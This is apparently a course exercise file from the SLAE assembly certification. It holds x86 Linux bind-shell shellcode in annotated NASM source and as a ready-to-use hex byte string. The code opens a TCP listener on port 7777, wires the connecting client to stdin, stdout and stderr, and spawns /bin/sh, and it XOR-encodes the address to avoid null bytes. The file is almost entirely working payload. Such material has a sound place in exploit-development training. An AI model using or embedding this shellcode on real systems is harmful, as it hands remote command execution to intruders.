; File Shellcode_bind_tcp.nasm
; Author: Saleh Bin Muhaysin
; SLEA: SLAE-1101
; Date: 25/12/2017



	; Note: we will use the socketcall (102), which control all
	; other socket functions
	; int socketcall(int call, unsigned long *args);
	; call numbers:
	; 1	socket
	; 2 	bind
	; 3 	connect
	; 4 	listen
	; 5 	accept
	; 9	send
	; 10	recv
	

;Shellcode:
;\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xdb\xb8\x8f\x01\x01\x10\x35\xf0\x01\x01\x11\x50\x66\x68\x1e\x61\x66\x6a\x02\x89\xe2\x6a\x10\x52\x56\x89\xe1\x31\xc0\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf6\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

global _start

section .text
_start:
	
	
	; ----------------------------------------
	; create new socket
	; int socket(int domain, int type, int protocol);
	; push the arguments for socket function
	xor eax, eax
	xor ebx, ebx
	push eax	; protocol = AF_INET (IPv4)
	push 1		; type = SOCK_STREAM (TCP)
	push 2		; domain = AF_INET   (Internet address) 
	mov ecx, esp	; get the argument
	
	mov bl, 1	; create socket subroutine
	mov al, 102	; __NR_socketcall 
	int 0x80
	mov esi, eax	; get the socket descriptor 


	; ----------------------------------------
	; bind the socket 
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	xor ebx, ebx
	
	; struct sockaddr *addr
	mov eax, 0x1001018f	; xor 0x1001018f with 0x110101f0 
	xor eax, 0x110101f0	; to get 0100007f (127.0.0.1)
	push dword eax		; Localhost 127.0.0.1 (in reverse order)
	push word 0x611E	; Port number 7777 (in reverse order)
	push word 2		; AF_INET (IPv4)
	mov edx, esp
	; push the arguments for bind function
	push dword 16	; socklen_t addrlen, structure socket size
	push edx 	; addr, pointer to sockaddr struct
	push esi	; sockfd, use the socket descriptor
	mov ecx, esp	; get the argument
	
	xor eax, eax
	mov al, 102	; __NR_socketcall
	mov bl, 2	; sub call bind, bind the socket just created
	int 0x80
	
	
	; ----------------------------------------
	; listen on the port for any connection
	; int listen(int sockfd, int backlog);
	xor eax, eax
	
	; push the arguments for listen function
	push eax	; backlog (queue size) , ecx = 0
	push esi	; sockfd, use the socket descriptor
	mov ecx, esp	; get the argument
	
	mov al, 102	; __NR_socketcall
	mov bl, 4	; sub call listen, list on the socket
	int 0x80
	
	
	; ----------------------------------------
	; accept any incoming connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	xor eax, eax
	
	; push the arguments for accept function
	push eax	; addrlen, client address length , al = 0
	push eax	; addr, client address  , al = 0
	push esi	; sockfd, use the socket descriptor
	mov ecx, esp	; get the argument
	
	mov al, 102	; __NR_socketcall
	mov bl, 5	; sub call accept, list on the socket
	int 0x80
	
	mov edi, eax	; get the client descriptor
	
	
	; ----------------------------------------
	; __NR_dup2: this will give the connector the control of 
	; out,in,error of the command line
	; int dup2(int oldfd, int newfd);
	mov ebx, edi	; old descriptor, client descriptor
	xor ecx, ecx
	mov cl, 2
dup_lab:
	xor eax, eax
	mov al, 63
	int 0x80
	dec cl
	jns dup_lab; loop until negative number (stdin=0, stdput=1, stderr=2)
	
	
	; ----------------------------------------
	; __NR_execve 11: the connector a command line /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	xor eax, eax
	xor ecx, ecx
	xor edx, edx
	mov al, 11
	; push the //bin/sh
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
	
	
